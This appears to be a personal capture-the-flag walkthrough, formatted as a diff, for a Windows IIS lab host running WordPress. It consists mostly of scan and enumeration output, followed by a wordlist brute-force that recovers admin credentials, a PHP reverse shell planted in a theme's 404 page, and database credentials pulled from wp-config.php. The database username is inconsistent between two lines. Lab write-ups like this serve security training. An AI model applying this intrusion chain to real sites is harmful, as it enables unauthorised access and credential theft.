@@ -1,0 +1,210 @@
+Nmap scan report for ip-10-10-85-63.eu-west-1.compute.internal (10.10.85.63)
+Host is up (0.00032s latency).
+
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info: 
+|   Target_Name: RETROWEB
+|   NetBIOS_Domain_Name: RETROWEB
+|   NetBIOS_Computer_Name: RETROWEB
+|   DNS_Domain_Name: RetroWeb
+|   DNS_Computer_Name: RetroWeb
+|   Product_Version: 10.0.14393
+|_  System_Time: 2022-08-30T16:53:45+00:00
+| ssl-cert: Subject: commonName=RetroWeb
+| Issuer: commonName=RetroWeb
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-08-29T16:47:22
+| Not valid after:  2023-02-28T16:47:22
+| MD5:   8cbc bc5d 5ec0 ca3a fdb5 de69 3b8c acea
+|_SHA-1: e995 eb27 a586 31cc fd0b 32db 1192 1173 d14d b521
+|_ssl-date: 2022-08-30T16:53:45+00:00; 0s from scanner time.
+5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+MAC Address: 02:56:E7:3D:66:BD (Unknown)
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.85.63
++ Target Hostname:    10.10.85.63
++ Target Port:        80
++ Start Time:         2022-08-30 17:33:22 (GMT0)
+---------------------------------------------------------------------------
++ Server: Microsoft-IIS/10.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST 
++ 7889 requests: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2022-08-30 17:33:43 (GMT0) (21 seconds)
+
+Target: http://10.10.85.63:80/retro/FUZZ
+Total requests: 37050
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                       
+===================================================================
+
+000000006:   200        385 L    3179 W   19935 Ch    "LICENSE.txt"                                 
+000000130:   200        98 L     845 W    7447 Ch     "readme.html"                                 
+000000206:   200        385 L    3179 W   19935 Ch    "license.txt"                                 
+000000001:   301        0 L      0 W      0 Ch        "index.php"                                   
+000000036:   200        68 L     205 W    2743 Ch     "wp-login.php"                                
+000000263:   200        0 L      0 W      0 Ch        "wp-config.php"                               
+000000377:   500        0 L      0 W      0 Ch        "wp-settings.php"                             
+000000005:   405        0 L      6 W      42 Ch       "xmlrpc.php"                                  
+000000297:   200        4 L      15 W     135 Ch      "wp-trackback.php"                            
+000000379:   301        0 L      0 W      0 Ch        "."                                           
+000000399:   403        122 L    318 W    2759 Ch     "wp-mail.php"                                 
+000000413:   200        0 L      0 W      0 Ch        "wp-cron.php"                                 
+000000448:   200        0 L      0 W      0 Ch        "wp-blog-header.php"                          
+000000838:   200        0 L      0 W      0 Ch        "wp-load.php"                                 
+000000462:   200        11 L     24 W     229 Ch      "wp-links-opml.php"                           
+000001073:   302        0 L      0 W      0 Ch        "wp-signup.php"                               
+000001947:   200        98 L     845 W    7447 Ch     "README.html"                                 
+000001507:   302        0 L      0 W      0 Ch        "wp-activate.php"                             
+000006072:   200        385 L    3179 W   19935 Ch    "LICENSE.TXT"                                 
+000005266:   301        0 L      0 W      0 Ch        "Index.php"                                   
+000020667:   200        385 L    3179 W   19935 Ch    "License.txt"                                 
+000025424:   404        29 L     95 W     1245 Ch     "directory_pop.html" 
+
+
+=======
+wpscan $IP/retro -e
+root@kali:~# wpscan --url $IP/retro
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.6
+                               
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://10.10.85.63/retro/ [10.10.85.63]
+[+] Started: Tue Aug 30 17:40:17 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entries:
+ |  - Server: Microsoft-IIS/10.0
+ |  - X-Powered-By: PHP/7.1.29
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://10.10.85.63/retro/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://10.10.85.63/retro/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://10.10.85.63/retro/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.2.1 identified (Insecure, released on 2019-05-21).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://10.10.85.63/retro/index.php/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
+ |  - http://10.10.85.63/retro/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.2.1</generator>
+
+[+] WordPress theme in use: 90s-retro
+ | Location: http://10.10.85.63/retro/wp-content/themes/90s-retro/
+ | Latest Version: 1.4.10 (up to date)
+ | Last Updated: 2019-04-15T00:00:00.000Z
+ | Readme: http://10.10.85.63/retro/wp-content/themes/90s-retro/readme.txt
+ | Style URL: http://10.10.85.63/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1
+ | Style Name: 90s Retro
+ | Style URI: https://organicthemes.com/retro-theme/
+ | Description: Have you ever wished your WordPress blog looked like an old Geocities site from the 90s!? Probably n...
+ | Author: Organic Themes
+ | Author URI: https://organicthemes.com
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.4.10 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://10.10.85.63/retro/wp-content/themes/90s-retro/style.css?ver=5.2.1, Match: 'Version: 1.4.10'
+
+[+] Enumerating All Plugins (via Passive Methods)
+
+[i] No plugins Found.
+
+[+] Enumerating Config Backups (via Passive and Aggressive Methods)
+ Checking Config Backups - Time: 00:00:01 <==============================================================> (137 / 137) 100.00% Time: 00:00:01
+
+[i] No Config Backups Found.
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up
+
+[+] Finished: Tue Aug 30 17:40:33 2022
+[+] Requests Done: 184
+[+] Cached Requests: 5
+[+] Data Sent: 40.967 KB
+[+] Data Received: 18.802 MB
+[+] Memory used: 240.066 MB
+[+] Elapsed time: 00:00:15
+
+**tryed rockyou.txt first but after 5mins no passwords found.
+**generated a passwordlist with cewl --> cewl $IP/retro > cewlpasswords.txt
+-->cewlpasswords.txt
+
+root@kali:~# wpscan --url $IP/retro -U wade -P cewlpasswords.txt -v
+[!] Valid Combinations Found:
+ | Username: wade, Password: parzival
+
+------
+login in with http://$IP/retro/wp-login.php
+wade:parzival
+
+-----------
+darkstar@darkstar7471.com
+wade is administrator on wp site
+
+change twentyseventeen 404 theme to rev-shell php from source code below
+
+https://github.com/ivan-sincek/php-reverse-shell/releases
+**save and curl the site
+curl http://$IP/retro/wp-content/themes/twentyseventeen/404.php
+
+**from rev-shell
+/retro/wp-config.php
+/** MySQL database username */
+define('DB_USER', 'wordpressuser567');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'YSPgW[%C.mQE');
+
+mysql -uwordpressuser537 -pYSPgW[%C.mQE
